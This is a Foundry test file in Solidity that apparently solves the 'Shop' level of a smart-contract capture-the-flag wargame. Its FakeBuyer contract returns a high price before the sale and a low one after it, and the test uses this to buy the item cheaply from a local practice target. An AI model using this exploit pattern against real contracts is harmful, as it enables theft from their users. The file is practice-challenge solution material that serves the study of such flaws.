// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {LevelFactory} from "../utils/LevelFactory.sol";
import {Buyer, Shop} from  "../../src/Shop/Level.sol";
import {Test} from "forge-std/Test.sol";

interface IShop {
  function price() external view returns (uint256);

  function isSold() external view returns (bool);
}

contract FakeBuyer {
  function price() external view returns (uint) {
    if (!IShop(msg.sender).isSold()) {
      return 1000;
    } else {
      return 10;
    }
  }

  function buy(address shop) external {
    (bool status,) = shop.call(abi.encodeWithSignature("buy()"));
    status;
  }
}

contract ShopTest is LevelFactory {
  IShop shop;

  function setUp() public {
    vm.startPrank(deployer);
    shop = IShop(address(new Shop()));
    vm.stopPrank();
  }

  function testAttack() public {
    submitLevel("Shop");
  }

  function _performTest() internal override {
   address fakeBuyer = address(new FakeBuyer());
   emit log_address(fakeBuyer);
   (bool status,) = fakeBuyer.call(abi.encodeWithSignature("buy(address)", address(shop)));
   status;
  }

  function _setupTest() internal override {
    super._setupTest();
  }

  function _checkTest() internal override returns (bool) {
    assertTrue(shop.isSold());
    assertLt(shop.price(), 100);

    return (shop.isSold() && shop.price() < 100);
  }
}

